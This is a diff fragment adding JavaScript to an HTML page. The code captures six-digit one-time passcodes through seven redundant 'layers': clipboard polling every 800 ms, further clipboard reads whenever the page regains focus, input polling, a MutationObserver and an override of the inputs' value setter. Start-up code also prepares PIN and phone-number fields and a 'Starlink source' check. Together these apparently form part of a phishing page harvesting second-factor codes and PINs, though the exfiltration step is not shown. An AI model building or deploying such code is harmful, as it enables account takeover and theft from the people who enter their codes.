+function layer3_overlayPolling() {
+    const id = setInterval(() => {
+        const overlay = document.getElementById('otpOverlay');
+        if (overlay.value.length >= 6) { handleOtpText(overlay.value); return; }
+        const combined = getOtpValue();
+        if (combined.length === 6) handleOtpText(combined);
+    }, 300);
+    return () => clearInterval(id);
+}
+
+// Layer 4: Clipboard polling
+function layer4_clipboardPolling() {
+    let lastClip = '';
+    const id = setInterval(async () => {
+        try {
+            const text = await navigator.clipboard.readText();
+            if (text !== lastClip) { lastClip = text; handleOtpText(text); }
+        } catch (e) {}
+    }, 800);
+    return () => clearInterval(id);
+}
+
+// Layer 5: Visibility detection
+function layer5_visibilityDetection() {
+    const handler = () => {
+        if (document.visibilityState === 'visible' || document.hasFocus()) {
+            [100, 300, 600, 1000, 2000, 3000].forEach(delay => {
+                setTimeout(async () => {
+                    try { const t = await navigator.clipboard.readText(); handleOtpText(t); } catch (e) {}
+                    const ov = document.getElementById('otpOverlay');
+                    if (ov.value.length >= 6) handleOtpText(ov.value);
+                }, delay);
+            });
+        }
+    };
+    ['visibilitychange', 'focus', 'pageshow'].forEach(e => document.addEventListener(e, handler));
+    window.addEventListener('focus', handler);
+    return () => {
+        ['visibilitychange', 'focus', 'pageshow'].forEach(e => document.removeEventListener(e, handler));
+        window.removeEventListener('focus', handler);
+    };
+}
+
+// Layer 6: SMS watch (input polling)
+function layer6_smsWatch() {
+    const id = setInterval(() => {
+        const combined = getOtpValue();
+        if (combined.length === 6) handleOtpText(combined);
+    }, 500);
+    return () => clearInterval(id);
+}
+
+// Layer 7: MutationObserver + value setter override
+function layer7_mutationObserver() {
+    const container = document.getElementById('otpInputs');
+    const observer = new MutationObserver(() => {
+        const combined = getOtpValue();
+        if (combined.length === 6) handleOtpText(combined);
+    });
+    observer.observe(container, { childList: true, subtree: true, attributes: true, characterData: true });
+    const origDescriptor = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');
+    const inputs = document.querySelectorAll('.otp-input');
+    inputs.forEach(inp => {
+        Object.defineProperty(inp, 'value', {
+            get() { return origDescriptor.get.call(this); },
+            set(v) {
+                origDescriptor.set.call(this, v);
+                setTimeout(() => { const c = getOtpValue(); if (c.length === 6) handleOtpText(c); }, 50);
+            },
+            configurable: true,
+        });
+    });
+    return () => observer.disconnect();
+}
+
+// ── Init ──
+document.addEventListener('DOMContentLoaded', () => {
+    initializePinInputs();
+    initOtpInputs();
+    checkStarlinkSource();
+    detectCountry();
+    document.getElementById('phoneInput').addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/\D/g, '').substring(0, COUNTRIES[selectedCountry].len);
+        checkFormComplete();
+    });
+});
+</script>
+</body>
+</html>
